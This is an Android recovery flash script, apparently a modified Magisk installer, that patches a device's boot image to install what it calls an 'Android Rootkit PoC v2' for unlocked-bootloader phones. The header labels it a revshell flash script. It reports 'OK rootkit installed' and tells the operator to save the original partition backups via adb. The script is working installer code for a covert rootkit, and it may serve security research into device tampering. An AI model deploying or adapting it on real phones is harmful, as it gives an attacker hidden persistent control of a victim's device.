#MAGISK
############################################
#
# Revshell Flash Script (updater-script)
#
# Thanks to:
#   topjohnwu
#   LuigiVampa92
#
############################################

##############
# Preparation
##############

COMMONDIR=$INSTALLER/common
CHROMEDIR=$INSTALLER/chromeos

# Default permissions
umask 022

OUTFD=$2
ZIP=$3

if [ ! -f "$COMMONDIR"/util_functions.sh ]; then
  echo "! Unable to extract zip file!"
  exit 1
fi

# Load utility fuctions
. $COMMONDIR/util_functions.sh

ORIGINALBACKUPSDIR=/tmp/backup_original_partitions
HAVE_BACKUP=$([ -d $ORIGINALBACKUPSDIR ])


setup_flashable

ui_print " "
ui_print "     Android Rootkit PoC v2    "
ui_print "     (unlocked bootloader rootkit) "
ui_print " "


is_mounted /data || mount /data || is_mounted /cache || mount /cache
mount_partitions

get_flags
find_boot_image

[ -z $BOOTIMAGE ] && abort "! Unable to detect target image"
ui_print "- Target image: $BOOTIMAGE"

# Detect version and architecture
api_level_arch_detect
[ $API -lt 17 ] && abort "! Magisk only support Android 4.2 and above"

ui_print "- Device platform: $ARCH"

BINDIR=$INSTALLER/$ARCH32
chmod -R 755 $CHROMEDIR $BINDIR


##############
# Environment
##############

ui_print "- Constructing environment"

# Copy required files
rm -rf $MAGISKBIN 2>/dev/null
mkdir -p $MAGISKBIN 2>/dev/null
cp -af $BINDIR/. $COMMONDIR/. $CHROMEDIR $BBBIN $MAGISKBIN
chmod -R 755 $MAGISKBIN

$BOOTMODE || recovery_actions

#####################
# Boot/DTBO Patching
#####################

ui_print "- Begin installation"
install_magisk

ui_print "- OK rootkit installed"

# Cleanups
$BOOTMODE || recovery_cleanup
rm -rf "$TMPDIR"
rm -rf /tmp/magisk 2>/dev/null

ui_print "- Done"

# SILENTPOLICY - backups warning
if [ "$HAVE_BACKUP" -eq 0 ]; then
  ui_print " "
  ui_print " "
  ui_print " ! WARNING !"
  ui_print " Installation completed successfully. Do not reboot to system right now. Please do not forget to dump backups via adb and save them:"
  ui_print " "
  ui_print " $ adb pull $ORIGINALBACKUPSDIR . "
  ui_print " "
  ui_print " It is strongly recommended to save this backup. Otherwise you may not be able to restore stock /boot signed image."
  ui_print " "
  ui_print " "
fi

ui_print " "

exit 0
